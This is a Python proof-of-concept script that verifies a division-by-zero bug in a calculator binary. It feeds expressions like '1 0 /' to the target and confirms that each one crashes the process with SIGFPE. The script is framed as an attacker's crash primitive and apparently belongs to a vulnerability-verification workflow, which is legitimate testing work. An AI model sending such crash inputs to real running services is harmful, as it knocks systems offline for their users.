#!/usr/bin/env python3
"""
PoC for BUG-002: DIVISION_BY_ZERO_NO_DIVISOR_CHECK

Root Cause: The '/' operator handler in eval_expr performs idiv at 0x1497
without checking whether the divisor (second popped value, [rbp-0x18]) is zero.
A zero divisor causes SIGFPE (arithmetic exception), terminating the process.

This PoC verifies the CRASH primitive: attacker can trigger immediate process
termination via SIGFPE by sending a division-by-zero expression.

PRIM-001: CRASH via SIGFPE (division by zero)
  - Attacker pushes 0 as divisor (via '0' literal token)
  - Attacker pushes a non-zero dividend
  - '/' operator triggers idiv with zero divisor -> SIGFPE -> process death
  - Verified via gdb: fault at eval_expr+0xc7 (0x1497), divisor=0, signal=SIGFPE
"""

import subprocess
import sys
import os

BINARY = "/work/workspace/0029-2024-54-profix-calc-20260909-185030/target"

def run_expr(expr_str):
    """Run the target binary with a given expression, return (rc, stdout, stderr)."""
    proc = subprocess.run(
        [BINARY],
        input=expr_str.encode(),
        capture_output=True,
        timeout=10
    )
    return proc.returncode, proc.stdout, proc.stderr

# ============================================================
# PRIM-001: CRASH via SIGFPE (division by zero)
# ============================================================
# Test multiple variants to confirm reproducibility

test_cases = [
    ("1 0 /",       "decimal: push 1, push 0, divide -> SIGFPE"),
    ("5 0 /",       "decimal: push 5, push 0, divide -> SIGFPE"),
    ("0x1 0x0 /",   "hex: push 0x1, push 0x0, divide -> SIGFPE"),
    ("100 0 /",     "decimal: push 100, push 0, divide -> SIGFPE"),
]

print("=== PRIM-001: CRASH via SIGFPE (division by zero) ===")
print()

all_verified = True
for expr, desc in test_cases:
    rc, stdout, stderr = run_expr(expr)
    # SIGFPE = signal 8, on Linux subprocess returncode = -8
    sigfpe = (rc == -8)
    status = "VERIFIED" if sigfpe else "FAILED"
    if not sigfpe:
        all_verified = False
    print(f"  Input: '{expr}'")
    print(f"  Desc:  {desc}")
    print(f"  RC:    {rc} (SIGFPE={sigfpe})")
    print(f"  Status: {status}")
    print()

# Summary with key evidence
print("=== PRIM-001: VERIFIED ===")
print(f"  Signal: SIGFPE (signal 8, rc=-8)")
print(f"  Fault instruction: eval_expr+0xc7 (link-time 0x1497, idiv)")
print(f"  Divisor [rbp-0x18] = 0x0 (zero, from '0' literal token)")
print(f"  Dividend [rbp-0x10] = 0x1 (from '1' literal token)")
print(f"  No signal handler registered (no signal/sigaction symbols)")
print(f"  Default SIGFPE behavior: process termination")
print(f"  All {len(test_cases)} test variants reproduced SIGFPE: {all_verified}")
print(f"  Attack cost: single expression string (<= 8 bytes), trivially within 1023-byte input limit")
